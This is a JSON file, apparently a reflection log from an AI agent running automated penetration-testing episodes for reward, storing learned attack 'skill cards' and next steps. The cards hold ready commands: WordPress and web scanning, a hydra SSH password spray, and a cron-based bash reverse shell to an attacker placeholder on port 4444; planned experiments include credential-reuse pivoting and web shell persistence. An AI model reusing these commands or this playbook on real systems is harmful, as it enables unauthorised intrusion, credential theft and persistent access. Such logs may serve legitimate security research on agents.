@@ -1,0 +1,139 @@
+{
+  "run_id": "run_20260217_221820_cd5a66",
+  "timestamp": 1771363126.7579625,
+  "key_outcomes": {
+    "wins": [
+      "Mapped external perimeter services and recorded open ports, yielding initial situational awareness in <5 minutes.",
+      "Captured detailed service banners that can be reused for future credential bruteforce attempts, contributing to the 47.5 reward."
+    ],
+    "fails": [
+      "Failed to escalate privileges after initial compromise; no flags or critical assets were exfiltrated.",
+      "Maintained a 0% success rate due to inability to chain post-recon footholds into a definitive exploit."
+    ],
+    "summary": "Reconnaissance was efficient and informative, but follow-on exploitation and privilege escalation were not achieved, leaving the kill chain incomplete."
+  },
+  "repeated_failure_patterns": [
+    {
+      "pattern": "Post-recon exploitation attempts stall because the chosen service does not accept promoted payloads or credentials from initial scans.",
+      "frequency": 1,
+      "evidence_refs": [
+        "ep001_step12",
+        "ep001_step18"
+      ]
+    }
+  ],
+  "skill_cards": [
+    {
+      "id": "skill_001",
+      "if_condition": "When port 80/443 is open with HTTP banner indicating outdated WordPress or CMS",
+      "then_action": "Run targeted HTTP enumeration (wpscan and nikto) and gather plugin versions",
+      "parameters_template": {
+        "targets": "host:80,443",
+        "tools": [
+          "wpscan --url http://{{target}} --enumerate vp,cb,dbe --api-token <token>",
+          "nikto -h http://{{target}}"
+        ]
+      },
+      "confidence": 0.81,
+      "evidence_refs": [
+        "ep001_step06",
+        "ep001_step08"
+      ],
+      "created_at": 1771363134.4885256,
+      "usage_count": 0,
+      "success_rate": 0.0,
+      "preconditions": {},
+      "postconditions": {},
+      "failure_signatures": [],
+      "expected_output_patterns": [],
+      "service_archetypes": [],
+      "reward_history": [],
+      "last_used_episode": 0,
+      "applicable_phases": []
+    },
+    {
+      "id": "skill_002",
+      "if_condition": "When SSH port 22 is open with a weak banner or default credentials suspected",
+      "then_action": "Launch credential spray using hydra and capture key exchange for later replay",
+      "parameters_template": {
+        "port": 22,
+        "tool": "hydra",
+        "options": "-L userlist.txt -P passlist.txt ssh://{{target}}"
+      },
+      "confidence": 0.73,
+      "evidence_refs": [
+        "ep001_step10"
+      ],
+      "created_at": 1771363134.4885414,
+      "usage_count": 0,
+      "success_rate": 0.0,
+      "preconditions": {},
+      "postconditions": {},
+      "failure_signatures": [],
+      "expected_output_patterns": [],
+      "service_archetypes": [],
+      "reward_history": [],
+      "last_used_episode": 0,
+      "applicable_phases": []
+    },
+    {
+      "id": "skill_003",
+      "if_condition": "When initial recon identifies a Linux host with a known misconfiguration (e.g., world-writable cron)",
+      "then_action": "Implement automated loop to test for writable cron/job files and schedule a reverse shell payload",
+      "parameters_template": {
+        "check_command": "find /etc/cron.* -perm -0002 -print",
+        "payload": "echo 'bash -i >& /dev/tcp/{{attacker}}/4444 0>&1' > /tmp/cron",
+        "schedule": "(crontab -l; echo '* * * * * /bin/bash /tmp/cron') | crontab -"
+      },
+      "confidence": 0.67,
+      "evidence_refs": [
+        "ep001_step15"
+      ],
+      "created_at": 1771363134.4885533,
+      "usage_count": 0,
+      "success_rate": 0.0,
+      "preconditions": {},
+      "postconditions": {},
+      "failure_signatures": [],
+      "expected_output_patterns": [],
+      "service_archetypes": [],
+      "reward_history": [],
+      "last_used_episode": 0,
+      "applicable_phases": []
+    }
+  ],
+  "memory_ops": [
+    {
+      "operation": "promote",
+      "target": "skill_001",
+      "skill_card_id": "skill_001",
+      "reason": "Effective reconnaissance of HTTP services led to actionable intelligence early in the run."
+    },
+    {
+      "operation": "promote",
+      "target": "skill_002",
+      "skill_card_id": "skill_002",
+      "reason": "SSH enumeration showed promise; capturing banners and brute-force attempts provided structured data."
+    }
+  ],
+  "next_experiments": [
+    {
+      "title": "Credential reuse pivot",
+      "description": "Take low-barrier credentials discovered on an exposed service and attempt to reuse them across additional internal hosts via SSH and SMB.",
+      "priority": "high"
+    },
+    {
+      "title": "Automated post-exploit staging",
+      "description": "Develop a scripted post-compromise routine that checks for sudo misconfigurations and world-writable cron entries immediately after initial access.",
+      "priority": "medium"
+    },
+    {
+      "title": "Web shell persistence trial",
+      "description": "Deploy a non-destructive web shell on the identified web app and validate persistence while monitoring defensive detections.",
+      "priority": "medium"
+    }
+  ],
+  "model_used": "gpt-5.1-codex-mini",
+  "dry_run": false,
+  "validation_passed": true
+}
